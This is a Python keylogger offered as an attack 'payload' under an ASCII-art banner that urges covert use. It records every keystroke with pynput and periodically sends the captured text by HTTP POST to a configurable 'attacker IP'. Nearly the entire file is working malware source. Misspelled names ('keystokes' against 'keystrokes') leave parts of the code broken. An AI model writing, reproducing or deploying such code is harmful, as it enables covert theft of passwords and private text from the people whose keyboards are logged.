"""
   ▄█   ▄█▄  ▄█     ▄████████  ▄██████▄     ▄█   ▄█▄ ███    █▄  
  ███ ▄███▀ ███    ███    ███ ███    ███   ███ ▄███▀ ███    ███ 
  ███▐██▀   ███▌   ███    ███ ███    ███   ███▐██▀   ███    ███ 
 ▄█████▀    ███▌  ▄███▄▄▄▄██▀ ███    ███  ▄█████▀    ███    ███ 
▀▀█████▄    ███▌ ▀▀███▀▀▀▀▀   ███    ███ ▀▀█████▄    ███    ███ 
  ███▐██▄   ███  ▀███████████ ███    ███   ███▐██▄   ███    ███ 
  ███ ▀███▄ ███    ███    ███ ███    ███   ███ ▀███▄ ███    ███ 
  ███   ▀█▀ █▀     ███    ███  ▀██████▀    ███   ▀█▀ ████████▀  (Payload)
  ▀                ███    ███              ▀                    
                                                   Zephyr
                                                   
Pro Tip: Keep it clean, keep it covert. Always ensure your actions align with legal boundaries and ethical standards. Use responsibly, and stay sharp:>>
"""

from pynput import keyboard
import requests
import json
import threading

keystrokes = "" # Global variable to store captured keystrokes

server_ip = "127.0.0.1" # Change this based on your attacker IP
server_port = 8080 # Change this based on your specified port
send_interval = 10 # Interval (in seconds) between sending keystrokes to the server (Change if you want)

def send_keystokes():
    try:
        # Create payload with keystrokes data in JSON format
        payload = json.dumps({"keyboardData": keystokes})
        # Send POST request to the server with the keystrokes data
        r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
        # Schedule next call to send_keystrokes function after specified interval
        timer = threading.Timer(send_interval, send_keystrokes)
        timer.start()
    except:
        print("Couldn't complete request!")

def handle_keystrokes(key):
    global keystrokes
    if key == keyboard.Key.enter:
        keystrokes += "\n" # Add newline character for Enter key
    elif key == keyboard.Key.tab:
        keystrokes += "\t" # Add tab character for Tab key
    elif key == keyboard.Key.space:
        keystrokes += " " # Add space for Space key
    elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r]:
        pass # Ignore modifier keys (Shift, Ctrl, Alt)
    elif key == keyboard.Key.backspace:
        if len(keystrokes) > 0:
            keystrokes = keystrokes[:-1] # Remove last character for Backspace key
    elif key == keyboard.Key.esc:
        return False # Stop listener when Esc key is pressed
    else:
        keystrokes += str(key).strip("'") # Add other keys to keystrokes, stripping extra quotes

# Set up and start the keyboard listener
with keyboard.Listener(on_press=handle_keystrokes) as listener:
    send_keystokes()
    listener.join()

